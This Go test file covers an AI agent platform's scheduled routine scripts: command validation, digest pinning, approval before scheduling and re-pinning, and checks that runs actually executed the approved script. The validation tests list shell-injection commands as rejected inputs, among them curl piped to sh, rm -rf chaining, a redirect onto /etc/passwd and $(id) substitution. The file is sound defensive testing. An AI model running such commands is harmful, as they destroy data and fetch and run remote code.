package runtime

import (
	"context"
	"crypto/sha256"
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/axiom-studio/openseal/pkg/skill"
	"github.com/axiom-studio/openseal/pkg/workspace"
)

// routineScriptFiles is a chat files store: immutable snapshots per chat.
type routineScriptFiles struct {
	snapshots map[string][]map[string]string // conversation -> version-1 -> path -> digest
}

func (f *routineScriptFiles) write(conversationID, path, digest string) {
	if f.snapshots == nil {
		f.snapshots = map[string][]map[string]string{}
	}
	versions := f.snapshots[conversationID]
	next := map[string]string{}
	if len(versions) > 0 {
		for name, value := range versions[len(versions)-1] {
			next[name] = value
		}
	}
	if digest == "" {
		delete(next, path)
	} else {
		next[path] = digest
	}
	f.snapshots[conversationID] = append(versions, next)
}

func (f *routineScriptFiles) ResolveChatFile(_ context.Context, _ Scope, _ ObjectiveOwner, conversationID, path string, version int64) (*ChatFile, error) {
	versions := f.snapshots[conversationID]
	if version == 0 {
		version = int64(len(versions))
	}
	if version < 1 || version > int64(len(versions)) {
		return nil, errors.New("chat files version is unavailable")
	}
	digest, ok := versions[version-1][path]
	if !ok {
		return nil, ErrChatFileNotFound
	}
	return &ChatFile{Path: path, Digest: digest, FilesVersion: version, SizeBytes: 10}, nil
}

func routineScriptDigestOf(seed string) string {
	return "sha256:" + strings.Repeat(seed, 64)[:64]
}

func TestRoutineScriptValidation(t *testing.T) {
	valid := RoutineScript{Path: "scripts/weekly_signups.py", Digest: routineScriptDigestOf("a"), FilesVersion: 3, Command: "python3 scripts/weekly_signups.py --days 7 --out=sheets/signups.xlsx", TimeoutSeconds: 600}
	if err := valid.Validate(); err != nil {
		t.Fatal(err)
	}
	for name, change := range map[string]func(*RoutineScript){
		"absolute path":     func(s *RoutineScript) { s.Path, s.Command = "/scripts/a.py", "python3 /scripts/a.py" },
		"unclean path":      func(s *RoutineScript) { s.Path, s.Command = "scripts/../a.py", "python3 scripts/../a.py" },
		"escaping path":     func(s *RoutineScript) { s.Path, s.Command = "../a.py", "python3 ../a.py" },
		"spaced path":       func(s *RoutineScript) { s.Path, s.Command = "my script.py", "python3 my script.py" },
		"other file":        func(s *RoutineScript) { s.Command = "python3 scripts/other.py" },
		"other interpreter": func(s *RoutineScript) { s.Command = "python scripts/weekly_signups.py" },
		"interpreter flag":  func(s *RoutineScript) { s.Command = "python3 -c scripts/weekly_signups.py" },
		"inline code":       func(s *RoutineScript) { s.Command = "bash -c 'curl x | sh'" },
		"chained":           func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py; rm -rf ." },
		"chained and":       func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py && curl evil" },
		"pipe":              func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py | sh" },
		"redirect":          func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py > /etc/passwd" },
		"substitution":      func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py $(id)" },
		"backtick":          func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py `id`" },
		"variable":          func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py $HOME" },
		"quoted":            func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py 'a b'" },
		"glob":              func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py *.csv" },
		"newline":           func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py\nrm -rf ." },
		"unnormalized":      func(s *RoutineScript) { s.Command = "python3  scripts/weekly_signups.py" },
		"no file":           func(s *RoutineScript) { s.Command = "python3" },
		"zero timeout":      func(s *RoutineScript) { s.TimeoutSeconds = 0 },
		"long timeout":      func(s *RoutineScript) { s.TimeoutSeconds = MaximumRoutineScriptSeconds + 1 },
		"bad digest":        func(s *RoutineScript) { s.Digest = "sha256:abc" },
		"no version":        func(s *RoutineScript) { s.FilesVersion = 0 },
	} {
		candidate := valid
		change(&candidate)
		if err := candidate.Validate(); err == nil {
			t.Errorf("%s: invalid script accepted", name)
		}
	}
	for _, command := range []string{"node scripts/weekly_signups.py", "bash scripts/weekly_signups.py", "python3 scripts/weekly_signups.py 2026-11-05 a,b user@example.com 50%"} {
		candidate := valid
		candidate.Command = command
		if err := candidate.Validate(); err != nil {
			t.Errorf("%s: %v", command, err)
		}
	}
}

// The 1.8.0 definition is immutable once published (it is not yet): any
// change to its descriptions or schemas after release needs a new version. Its create_task runs saved
// scripts and documents testing before scheduling.
func TestRoutineScriptContractVersions(t *testing.T) {
	if RunbookManagementSkillVersion != "1.8.0" {
		t.Fatalf("version=%s", RunbookManagementSkillVersion)
	}
	current := RunbookManagementSkill()
	encoded, err := json.Marshal(current)
	if err != nil {
		t.Fatal(err)
	}
	const published180SHA256 = "2a531547d90039558b9a1286a7455020b9f8c84d423331abe01c544996790b8f"
	if got := fmt.Sprintf("%x", sha256.Sum256(encoded)); got != published180SHA256 {
		t.Fatalf("published 1.8.0 definition changed: got %s", got)
	}
	create := current.Actions[RunbookActionCreateTask]
	if _, ok := create.InputSchema["properties"].(map[string]interface{})["script"]; !ok || !strings.Contains(create.Description, "test it in this chat's sandbox with run_command") {
		t.Fatalf("create_task contract=%s", create.Description)
	}
	if setScript, ok := current.Actions[RunbookActionSetScript]; !ok || !setScript.AlwaysReview() {
		t.Fatal("set_script must always be reviewed")
	}
	if !strings.Contains(workspace.ChatSandboxDescription, "a routine can run that exact script") {
		t.Fatal("run_command does not mention scheduling a tested script")
	}
	if err := skill.NewCatalog().Register(t.Context(), current); err != nil {
		t.Fatal(err)
	}
}

// Creating and re-pinning a script routine both always ask, in every mode.
func TestRoutineScriptChangesAlwaysNeedApproval(t *testing.T) {
	definition := RunbookManagementSkill()
	for _, action := range []string{RunbookActionCreateTask, RunbookActionSetScript} {
		decision, err := NewDefaultActionPolicy().EvaluateAction(t.Context(), ActionPolicyInput{
			Run:   &AgentRun{ID: "run", Scope: Scope{Kind: "tenant", ID: "one"}},
			Bound: &skill.BoundAction{Definition: definition, Binding: &skill.Binding{ID: "routines"}, Action: definition.Actions[action]}, ApprovalMode: ConversationApprovalSkip,
			RoutineGrant: &RoutineGrant{Action: RunbookManagementSkillID + "." + action, Label: "anything"},
		})
		if err != nil || decision.Disposition != ActionDispositionRequireApproval || decision.ApprovalTimeout == ApprovalTimeoutApprove {
			t.Fatalf("%s: %#v %v", action, decision, err)
		}
	}
}

type routineScriptHost struct {
	requests []HostedTurnRequest
	respond  func(HostedTurnRequest) (*HostedTurnResponse, error)
}

func (h *routineScriptHost) ExecuteHostedTurn(_ context.Context, request HostedTurnRequest) (*HostedTurnResponse, error) {
	h.requests = append(h.requests, request)
	return h.respond(request)
}

func routineScriptReply(request HostedTurnRequest, summary string) *HostedTurnResponse {
	return &HostedTurnResponse{APIVersion: HostedTurnAPIVersion, InvocationID: request.InvocationID, ModelProvider: "test", Model: "model",
		NextRunStatus: AgentRunStatusCompleted, OutputSummary: summary, RunOutput: map[string]interface{}{"summary": summary}}
}

func TestRoutineScriptPinsPreviewsDriftsRepinsAndRunsFirstAcrossStores(t *testing.T) {
	forActionLifecycleStores(t, func(t *testing.T, store KernelStore) {
		ctx := t.Context()
		run, catalog, bound, args := scheduledTaskFixture(t, store)
		conversationID := run.Context[conversationRunContextConversationID].(string)
		files := &routineScriptFiles{}
		files.write(conversationID, "data/signups.csv", routineScriptDigestOf("c"))
		files.write(conversationID, "scripts/weekly.py", routineScriptDigestOf("a"))
		validator, _ := NewRunbookActionValidator(store.(runbookActionStore))
		validator.SetChatFiles(files)
		resolve := func(arguments map[string]interface{}) (map[string]interface{}, error) {
			resolved, _, err := validator.ResolveActionProposalArguments(ctx, ActionProposalValidationInput{Run: run, Bound: bound, Arguments: arguments})
			return resolved, err
		}

		// The model never chooses the version: its digest is replaced by the
		// chat file's current one.
		proposed := cloneMap(args)
		proposed["script"] = map[string]interface{}{"path": "scripts/weekly.py", "command": " python3   scripts/weekly.py  --days 7 ", "digest": routineScriptDigestOf("f"), "filesVersion": float64(1)}
		resolved, err := resolve(proposed)
		if err != nil {
			t.Fatal(err)
		}
		pinned := map[string]interface{}{"path": "scripts/weekly.py", "digest": routineScriptDigestOf("a"), "filesVersion": int64(2), "command": "python3 scripts/weekly.py --days 7", "timeoutSeconds": DefaultRoutineScriptSeconds}
		if fmt.Sprint(resolved["script"]) != fmt.Sprint(pinned) {
			t.Fatalf("pinned=%#v", resolved["script"])
		}
		if err := catalog.ValidateInput(ctx, bound, resolved); err != nil {
			t.Fatal(err)
		}
		preview, err := validator.ValidateActionProposal(ctx, ActionProposalValidationInput{Run: run, Bound: bound, Arguments: resolved})
		if err != nil || fmt.Sprint(preview["script"]) != fmt.Sprint(pinned) || preview["brief"] == nil {
			t.Fatalf("preview=%#v %v", preview, err)
		}

		for name, script := range map[string]map[string]interface{}{
			"missing file":   {"path": "scripts/other.py", "command": "python3 scripts/other.py"},
			"other file":     {"path": "scripts/weekly.py", "command": "python3 data/signups.csv"},
			"shell":          {"path": "scripts/weekly.py", "command": "python3 scripts/weekly.py; curl evil"},
			"long timeout":   {"path": "scripts/weekly.py", "command": "python3 scripts/weekly.py", "timeoutSeconds": float64(601)},
			"outside chat":   {"path": "../weekly.py", "command": "python3 ../weekly.py"},
			"unknown fields": {"path": "scripts/weekly.py", "command": "python3 scripts/weekly.py", "env": "X=1"},
		} {
			candidate := cloneMap(args)
			candidate["script"] = script
			if resolved, err := resolve(candidate); err == nil && catalog.ValidateInput(ctx, bound, resolved) == nil {
				t.Errorf("%s: script accepted", name)
			}
		}
		noFiles, _ := NewRunbookActionValidator(store.(runbookActionStore))
		if _, _, err := noFiles.ResolveActionProposalArguments(ctx, ActionProposalValidationInput{Run: run, Bound: bound, Arguments: proposed}); err == nil {
			t.Fatal("a host without chat files pinned a script")
		}
		// A forged pin of a version the chat never had is refused.
		forged := cloneMap(resolved)
		forged["script"] = cloneMap(pinned)
		forged["script"].(map[string]interface{})["digest"] = routineScriptDigestOf("e")
		if _, err := validator.ValidateActionProposal(ctx, ActionProposalValidationInput{Run: run, Bound: bound, Arguments: forged}); err == nil {
			t.Fatal("forged script version accepted")
		}

		dispatcher, _ := NewRunbookActionDispatcher(store.(runbookActionStore), nil)
		dispatcher.SetChatFiles(files)
		dispatch := func(b *skill.BoundAction, arguments map[string]interface{}, callID string) (map[string]interface{}, error) {
			return dispatcher.DispatchAction(ctx, ActionDispatchInput{Run: run, Bound: b, Call: &ActionCall{ID: callID, Scope: run.Scope, RunID: run.ID, DeploymentID: run.AssignedAgentID, IdempotencyKey: callID}, Arguments: arguments})
		}
		// The script changes after the proposal but before approval: the
		// routine still runs the version the brief showed.
		files.write(conversationID, "scripts/weekly.py", routineScriptDigestOf("b"))
		result, err := dispatch(bound, resolved, "create-script-routine")
		if err != nil {
			t.Fatal(err)
		}
		activation := result["activation"].(*RunbookActivation)
		stored, err := store.GetRunbookActivation(ctx, run.Scope, activation.ID)
		if err != nil || stored.Task == nil || stored.Task.Script == nil || stored.Task.Script.ApprovedAt == nil {
			t.Fatalf("stored=%#v %v", stored, err)
		}
		// Approval is recorded when the brief is applied, outside the
		// approved arguments.
		storedPin := routineScriptMap(stored.Task.Script)
		if storedPin["approvedAt"] == nil {
			t.Fatalf("stored pin=%#v", storedPin)
		}
		delete(storedPin, "approvedAt")
		if fmt.Sprint(storedPin) != fmt.Sprint(pinned) {
			t.Fatalf("stored pin=%#v", storedPin)
		}
		firstApproval := *stored.Task.Script.ApprovedAt

		// Drift: the chat file now differs from the approved version.
		status, err := NewRunbookActivationService(store).RoutineScriptStatus(ctx, files, run.Scope, activation.ID)
		if err != nil || !status.Changed || status.CurrentDigest != routineScriptDigestOf("b") || status.CurrentFilesVersion != 3 || status.Pinned.Digest != routineScriptDigestOf("a") ||
			status.Pinned.ApprovedAt == nil || !status.Pinned.ApprovedAt.Equal(firstApproval) {
			t.Fatalf("status=%#v %v", status, err)
		}

		// The occurrence carries the version pinned when it started.
		due := stored.NextRunAt.Add(time.Second)
		scheduler := NewRunbookScheduler(store)
		scheduler.now = func() time.Time { return due }
		if r, err := scheduler.ReconcileScope(ctx, run.Scope, 20); err != nil || r.Scheduled != 1 {
			t.Fatalf("schedule=%#v,%v", r, err)
		}
		runs, err := store.ListAgentRuns(ctx, AgentRunFilter{Scope: run.Scope, ObjectiveID: stored.ObjectiveID, Limit: 10})
		if err != nil || len(runs) != 1 {
			t.Fatalf("runs=%#v %v", runs, err)
		}
		occurrence := runs[0]
		if script, ok, err := routineScriptFromRun(occurrence); err != nil || !ok || script.Digest != routineScriptDigestOf("a") || script.FilesVersion != 2 {
			t.Fatalf("occurrence script=%#v %v %v", script, ok, err)
		}

		// Re-pinning asks again with the brief, pinned by the kernel.
		if stored, err = store.GetRunbookActivation(ctx, run.Scope, activation.ID); err != nil {
			t.Fatal(err)
		}
		setScript := RunbookManagementSkill().Actions[RunbookActionSetScript]
		repinBound := &skill.BoundAction{Definition: bound.Definition, Binding: bound.Binding, Action: setScript}
		repin := map[string]interface{}{"activationId": activation.ID, "expectedRevision": float64(stored.Revision), "digest": routineScriptDigestOf("f")}
		repinResolved, _, err := validator.ResolveActionProposalArguments(ctx, ActionProposalValidationInput{Run: run, Bound: repinBound, Arguments: repin})
		if err != nil || repinResolved["digest"] != routineScriptDigestOf("b") || repinResolved["filesVersion"] != int64(3) {
			t.Fatalf("repin=%#v %v", repinResolved, err)
		}
		repinPreview, err := validator.ValidateActionProposal(ctx, ActionProposalValidationInput{Run: run, Bound: repinBound, Arguments: repinResolved})
		if err != nil || repinPreview["operation"] != RunbookActionSetScript || repinPreview["title"] != "Forecast update" ||
			repinPreview["script"].(map[string]interface{})["digest"] != routineScriptDigestOf("b") || repinPreview["previousScript"].(map[string]interface{})["digest"] != routineScriptDigestOf("a") ||
			repinPreview["script"].(map[string]interface{})["command"] != "python3 scripts/weekly.py --days 7" ||
			repinPreview["previousScript"].(map[string]interface{})["approvedAt"] == nil || repinPreview["script"].(map[string]interface{})["approvedAt"] != nil {
			t.Fatalf("repin preview=%#v %v", repinPreview, err)
		}
		stale := cloneMap(repinResolved)
		stale["expectedRevision"] = float64(stored.Revision + 5)
		if _, err := dispatch(repinBound, stale, "stale-repin"); !errors.Is(err, ErrRunbookActivationRevision) {
			t.Fatalf("stale repin=%v", err)
		}
		repinned, err := dispatch(repinBound, repinResolved, "repin")
		if err != nil {
			t.Fatal(err)
		}
		after := repinned["activation"].(*RunbookActivation)
		if after.Task.Script.Digest != routineScriptDigestOf("b") || after.Task.Script.FilesVersion != 3 || after.Revision != stored.Revision+1 || after.Task.Script.Command != stored.Task.Script.Command ||
			after.Task.Script.ApprovedAt == nil || after.Task.Script.ApprovedAt.Before(firstApproval) {
			t.Fatalf("repinned=%#v", after.Task.Script)
		}
		if replay, err := dispatch(repinBound, repinResolved, "repin"); err != nil || replay["replayed"] != true {
			t.Fatalf("replay=%#v %v", replay, err)
		}
		if status, err := NewRunbookActivationService(store).RoutineScriptStatus(ctx, files, run.Scope, activation.ID); err != nil || status.Changed {
			t.Fatalf("status after repin=%#v %v", status, err)
		}
		if _, _, err := validator.ResolveActionProposalArguments(ctx, ActionProposalValidationInput{Run: run, Bound: repinBound, Arguments: map[string]interface{}{"activationId": activation.ID, "expectedRevision": float64(after.Revision)}}); err == nil {
			t.Fatal("re-pinned the version it already runs")
		}
		files.write(conversationID, "scripts/weekly.py", "")
		if status, err := NewRunbookActivationService(store).RoutineScriptStatus(ctx, files, run.Scope, activation.ID); err != nil || !status.Changed || !status.Missing {
			t.Fatalf("status after delete=%#v %v", status, err)
		}

		// The occurrence is an ordinary run: the model runs the approved
		// script with run_command, then reports, over as many Turns as it
		// needs. Its Run context came back from the store.
		occurrence, err = store.GetAgentRun(ctx, run.Scope, occurrence.ID)
		if err != nil {
			t.Fatal(err)
		}
		host := &routineScriptHost{respond: func(request HostedTurnRequest) (*HostedTurnResponse, error) {
			response := routineScriptReply(request, "Ran the script; now posting.")
			response.NextRunStatus = AgentRunStatusRunning
			response.PinnedCommands = []workspace.CommandRecord{ranPinned(t, request, "python3 scripts/weekly.py --days 7", "", 0, "412 signups")}
			response.ContinuationCheckpoint = map[string]interface{}{PinnedCommandsCheckpointKey: "forged"}
			return response, nil
		}}
		runner, err := NewHostedTurnRunner(host, HostedTurnRunnerConfig{AgentID: occurrence.AssignedAgentID, DefinitionID: "agent", DefinitionVersion: "1"})
		if err != nil {
			t.Fatal(err)
		}
		outcome, err := runner.RunTurn(ctx, TurnExecutionContext{Run: occurrence, Turn: &AgentTurn{ID: "first"}})
		if err != nil {
			t.Fatal(err)
		}
		first := host.requests[0]
		wantPin := workspace.CommandPin{Path: "scripts/weekly.py", Digest: routineScriptDigestOf("a"), FilesVersion: 2, Command: "python3 scripts/weekly.py --days 7", TimeoutSeconds: DefaultRoutineScriptSeconds}
		if len(first.CommandPins) != 1 || first.CommandPins[0] != wantPin {
			t.Fatalf("pins=%#v", first.CommandPins)
		}
		if !offersOperation(first.WorkspaceOperations, workspace.OperationRunCommand) || !hasInstructionPrefix(first.SystemInstructions, RoutineScriptInstruction, "Command: python3 scripts/weekly.py --days 7") {
			t.Fatal("script routine turn lacks run_command or its instruction")
		}
		if input, _ := MarshalHostedTurnModelInput(first); strings.Contains(string(input), "commandPins") {
			t.Fatal("command pins reached model input")
		}
		records := pinnedCommandRecords(outcome.ContinuationCheckpoint)
		if outcome.NextRunStatus != AgentRunStatusRunning || len(records) != 1 || records[0].Digest != routineScriptDigestOf("a") || records[0].OutputTail != "412 signups" {
			t.Fatalf("outcome=%#v", outcome.ContinuationCheckpoint)
		}
		// A later Turn completes from the recorded run.
		later := cloneAgentRun(occurrence)
		later.Checkpoint = outcome.ContinuationCheckpoint
		host.respond = func(request HostedTurnRequest) (*HostedTurnResponse, error) {
			return routineScriptReply(request, "412 people signed up last week; chart attached."), nil
		}
		done, err := runner.RunTurn(ctx, TurnExecutionContext{Run: later, Turn: &AgentTurn{ID: "second"}})
		if err != nil {
			t.Fatal(err)
		}
		if second := host.requests[1]; len(second.CommandPins) != 1 || done.NextRunStatus != AgentRunStatusCompleted || requiresFinalFailureExplanation(done.ContinuationCheckpoint) ||
			done.OutputSummary != "412 people signed up last week; chart attached." || len(host.requests) != 2 {
			t.Fatalf("second turn=%#v", done)
		}
	})
}

// ranPinned is what a host reports after the model ran command: the pin
// attached as run_command's expectedDigest, and the sandbox's result.
func ranPinned(t *testing.T, request HostedTurnRequest, command, directory string, exitStatus int, stderr string) workspace.CommandRecord {
	t.Helper()
	arguments := map[string]interface{}{"command": command}
	if directory != "" {
		arguments["workingDirectory"] = directory
	}
	pinned, pin := workspace.PinRunCommand(request.CommandPins, arguments)
	if pin == nil {
		t.Fatalf("%s was not pinned", command)
	}
	expected, _ := workspace.ExpectedDigestOf(pinned)
	record, ok := workspace.RecordPinnedCommand(pinned, map[string]interface{}{
		"exitStatus": float64(exitStatus), "stdout": "", "stderr": stderr,
		workspace.ExpectedDigestArgument: map[string]interface{}{"path": expected.Path, "digest": expected.Digest, "filesVersion": float64(expected.FilesVersion)},
	})
	if !ok {
		t.Fatal("no record")
	}
	return record
}

func hasInstruction(values []string, want string) bool {
	for _, value := range values {
		if value == want {
			return true
		}
	}
	return false
}

func hasInstructionPrefix(values []string, prefix, contains string) bool {
	for _, value := range values {
		if strings.HasPrefix(value, prefix) && strings.Contains(value, contains) {
			return true
		}
	}
	return false
}

func routineScriptRun() *AgentRun {
	return &AgentRun{ID: "occurrence", Scope: Scope{Kind: "tenant", ID: "one"}, AssignedAgentID: "agent", Context: map[string]interface{}{
		conversationRunContextConversationID: "chat",
		RoutineScriptContextKey: map[string]interface{}{"path": "scripts/weekly.py", "digest": routineScriptDigestOf("a"), "filesVersion": float64(2),
			"command": "python3 scripts/weekly.py", "timeoutSeconds": float64(120)},
	}}
}

// The host attaches the routine's pin to every run_command that invokes the
// script, and only to those; the model cannot supply one.
func TestRoutineScriptPinIsAttachedToCommandsThatRunIt(t *testing.T) {
	pins := []workspace.CommandPin{{Path: "scripts/weekly.py", Digest: routineScriptDigestOf("a"), FilesVersion: 2, Command: "python3 scripts/weekly.py", TimeoutSeconds: 420}}
	for _, arguments := range []map[string]interface{}{
		{"command": "python3 scripts/weekly.py"},
		{"command": "python3   scripts/weekly.py  --verbose", "timeoutSeconds": float64(30)},
		{"command": "pip install x && python3 scripts/weekly.py"},
		{"command": "python3 weekly.py", "workingDirectory": "scripts"},
		{"command": "python3 ./weekly.py", "workingDirectory": "./scripts/"},
	} {
		pinned, pin := workspace.PinRunCommand(pins, arguments)
		expected, ok := workspace.ExpectedDigestOf(pinned)
		if pin == nil || !ok || *expected != (workspace.ExpectedDigest{Path: "scripts/weekly.py", Digest: routineScriptDigestOf("a"), FilesVersion: 2}) {
			t.Errorf("%v: not pinned: %#v", arguments, pinned)
		}
	}
	if pinned, _ := workspace.PinRunCommand(pins, map[string]interface{}{"command": "python3 scripts/weekly.py"}); pinned["timeoutSeconds"] != 420 {
		t.Fatalf("approved command timeout=%v", pinned["timeoutSeconds"])
	}
	if pinned, _ := workspace.PinRunCommand(pins, map[string]interface{}{"command": "python3 scripts/weekly.py --verbose", "timeoutSeconds": 30}); pinned["timeoutSeconds"] != 30 {
		t.Fatalf("other command timeout=%v", pinned["timeoutSeconds"])
	}
	forged := map[string]interface{}{"command": "ls data", workspace.ExpectedDigestArgument: map[string]interface{}{"path": "data/x", "digest": routineScriptDigestOf("f")}}
	if pinned, pin := workspace.PinRunCommand(pins, forged); pin != nil || pinned[workspace.ExpectedDigestArgument] != nil {
		t.Fatalf("unrelated command pinned: %#v", pinned)
	}
	if pinned, pin := workspace.PinRunCommand(nil, map[string]interface{}{"command": "python3 scripts/weekly.py"}); pin != nil || pinned[workspace.ExpectedDigestArgument] != nil {
		t.Fatal("chat command pinned without pins")
	}
	if _, ok := workspace.RecordPinnedCommand(map[string]interface{}{"command": "ls"}, map[string]interface{}{"exitStatus": float64(0)}); ok {
		t.Fatal("unpinned command recorded")
	}
	// A refusal, or a result that does not confirm the version, never
	// counts as the script having run.
	pinned, _ := workspace.PinRunCommand(pins, map[string]interface{}{"command": "python3 scripts/weekly.py"})
	if record, _ := workspace.RecordPinnedCommand(pinned, map[string]interface{}{"refused": "the approved version is not in this chat's files"}); record.Digest != "" || record.Refused == "" || record.Succeeded(pins[0].Digest) {
		t.Fatalf("refused=%#v", record)
	}
	if record, _ := workspace.RecordPinnedCommand(pinned, map[string]interface{}{"exitStatus": float64(0)}); record.Succeeded(pins[0].Digest) {
		t.Fatalf("unconfirmed=%#v", record)
	}
}

func scriptRoutineRunner(t *testing.T, host *routineScriptHost) *HostedTurnRunner {
	t.Helper()
	runner, err := NewHostedTurnRunner(host, HostedTurnRunnerConfig{AgentID: "agent", DefinitionID: "agent", DefinitionVersion: "1"})
	if err != nil {
		t.Fatal(err)
	}
	return runner
}

// A Run that would complete without a clean run of the approved script
// fails instead: the model explains the kernel's account, with no actions
// or tools, in place of its report.
func TestRoutineScriptCompletionCheckFailsRunsThatDidNotRunTheScript(t *testing.T) {
	for name, testCase := range map[string]struct {
		records func(*testing.T, HostedTurnRequest) []workspace.CommandRecord
		want    []string
	}{
		"never ran": {
			records: func(*testing.T, HostedTurnRequest) []workspace.CommandRecord { return nil },
			want:    []string{"The routine's script did not run: python3 scripts/weekly.py"},
		},
		"failed": {
			records: func(t *testing.T, request HostedTurnRequest) []workspace.CommandRecord {
				return []workspace.CommandRecord{ranPinned(t, request, "python3 scripts/weekly.py", "", 1, "Traceback (most recent call last):\nKeyError: 'signup_date'")}
			},
			want: []string{"exited with status 1: python3 scripts/weekly.py", "Last output:", "KeyError: 'signup_date'"},
		},
		"edited script refused": {
			records: func(t *testing.T, request HostedTurnRequest) []workspace.CommandRecord {
				pinned, _ := workspace.PinRunCommand(request.CommandPins, map[string]interface{}{"command": "python3 scripts/weekly.py"})
				record, _ := workspace.RecordPinnedCommand(pinned, map[string]interface{}{"refused": "the chat's files hold another version of scripts/weekly.py than the approved one; it was not run"})
				return []workspace.CommandRecord{record}
			},
			want: []string{"The routine's script scripts/weekly.py could not run: the chat's files hold another version"},
		},
		"other command": {
			records: func(t *testing.T, request HostedTurnRequest) []workspace.CommandRecord {
				return []workspace.CommandRecord{ranPinned(t, request, "python3 scripts/weekly.py --skip-checks", "", 0, "")}
			},
			want: []string{"did not run as approved: python3 scripts/weekly.py"},
		},
	} {
		t.Run(name, func(t *testing.T) {
			host := &routineScriptHost{}
			host.respond = func(request HostedTurnRequest) (*HostedTurnResponse, error) {
				if len(host.requests) == 1 {
					response := routineScriptReply(request, "All done: 412 signups.")
					response.PinnedCommands = testCase.records(t, request)
					response.Usage = TurnUsage{InputTokens: 100, OutputTokens: 10}
					return response, nil
				}
				if len(request.Actions) != 0 || len(request.WorkspaceOperations) != 0 || request.Workspace != nil || len(request.CommandPins) != 0 ||
					!hasInstruction(request.SystemInstructions, RoutineScriptFailureInstruction) || !hasInstruction(request.SystemInstructions, FinalFailureExplanationSystemInstruction) {
					t.Fatalf("explanation offers work: %#v", request)
				}
				response := routineScriptReply(request, "The signup script did not finish, so there is no report this week.")
				response.Usage = TurnUsage{InputTokens: 50, OutputTokens: 5}
				return response, nil
			}
			outcome, err := scriptRoutineRunner(t, host).RunTurn(t.Context(), TurnExecutionContext{Run: routineScriptRun(), Turn: &AgentTurn{ID: "first"}})
			if err != nil {
				t.Fatal(err)
			}
			if len(host.requests) != 2 || outcome.OutputSummary != "The signup script did not finish, so there is no report this week." || outcome.NextRunStatus != AgentRunStatusCompleted {
				t.Fatalf("outcome=%#v", outcome)
			}
			failure, _ := outcome.ContinuationCheckpoint[FinalFailureExplanationCheckpointKey].(map[string]interface{})
			message, _ := failure["message"].(string)
			if failure["kind"] != routineScriptFailureKind {
				t.Fatalf("failure=%#v", failure)
			}
			for _, want := range testCase.want {
				if !strings.Contains(message, want) {
					t.Fatalf("message %q lacks %q", message, want)
				}
			}
			if outcome.Usage.InputTokens != 150 || outcome.Usage.OutputTokens != 15 {
				t.Fatalf("usage=%#v", outcome.Usage)
			}
		})
	}
}

// The kernel accepts only records of the pinned script at its pinned
// version, and only on a script routine's Turns. A chat's own run_command
// calls are not pinned or checked.
func TestRoutineScriptHostContractIsEnforced(t *testing.T) {
	for name, change := range map[string]func(*workspace.CommandRecord){
		"other version": func(r *workspace.CommandRecord) { r.Digest = routineScriptDigestOf("b") },
		"other file":    func(r *workspace.CommandRecord) { r.Path = "scripts/other.py" },
		"unexplained":   func(r *workspace.CommandRecord) { r.Digest, r.Refused = "", "" },
		"huge output": func(r *workspace.CommandRecord) {
			r.OutputTail = strings.Repeat("x", workspace.MaximumCommandRecordOutputTail+1)
		},
		"bad exit":       func(r *workspace.CommandRecord) { r.ExitCode = 300 },
		"invalid output": func(r *workspace.CommandRecord) { r.OutputTail = string([]byte{0xff}) },
	} {
		host := &routineScriptHost{respond: func(request HostedTurnRequest) (*HostedTurnResponse, error) {
			response := routineScriptReply(request, "Done.")
			record := ranPinned(t, request, "python3 scripts/weekly.py", "", 0, "")
			change(&record)
			response.PinnedCommands = []workspace.CommandRecord{record}
			return response, nil
		}}
		if _, err := scriptRoutineRunner(t, host).RunTurn(t.Context(), TurnExecutionContext{Run: routineScriptRun(), Turn: &AgentTurn{ID: "first"}}); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
	// A clean run completes in one Turn.
	host := &routineScriptHost{respond: func(request HostedTurnRequest) (*HostedTurnResponse, error) {
		response := routineScriptReply(request, "412 signups.")
		response.PinnedCommands = []workspace.CommandRecord{ranPinned(t, request, "python3 scripts/weekly.py", "", 0, "")}
		return response, nil
	}}
	if outcome, err := scriptRoutineRunner(t, host).RunTurn(t.Context(), TurnExecutionContext{Run: routineScriptRun(), Turn: &AgentTurn{ID: "first"}}); err != nil ||
		outcome.NextRunStatus != AgentRunStatusCompleted || requiresFinalFailureExplanation(outcome.ContinuationCheckpoint) || len(host.requests) != 1 {
		t.Fatalf("clean run=%#v %v", outcome, err)
	}

	// A chat Run: no pins, no check, and no records accepted.
	plain := &AgentRun{ID: "plain", Scope: Scope{Kind: "tenant", ID: "one"}, Context: map[string]interface{}{conversationRunContextConversationID: "chat"}}
	host = &routineScriptHost{respond: func(request HostedTurnRequest) (*HostedTurnResponse, error) {
		return routineScriptReply(request, "Ran it."), nil
	}}
	outcome, err := scriptRoutineRunner(t, host).RunTurn(t.Context(), TurnExecutionContext{Run: plain, Turn: &AgentTurn{ID: "first"}})
	if err != nil || outcome.NextRunStatus != AgentRunStatusCompleted || len(host.requests) != 1 || host.requests[0].CommandPins != nil ||
		!offersOperation(host.requests[0].WorkspaceOperations, workspace.OperationRunCommand) || hasInstructionPrefix(host.requests[0].SystemInstructions, RoutineScriptInstruction, "") {
		t.Fatalf("chat run=%#v %v", outcome, err)
	}
	host.respond = func(request HostedTurnRequest) (*HostedTurnResponse, error) {
		response := routineScriptReply(request, "Done.")
		response.PinnedCommands = []workspace.CommandRecord{{Command: "python3 scripts/weekly.py", Path: "scripts/weekly.py", Digest: routineScriptDigestOf("a")}}
		return response, nil
	}
	if _, err := scriptRoutineRunner(t, host).RunTurn(t.Context(), TurnExecutionContext{Run: plain, Turn: &AgentTurn{ID: "second"}}); err == nil {
		t.Fatal("host invented pinned commands for a chat run")
	}
}
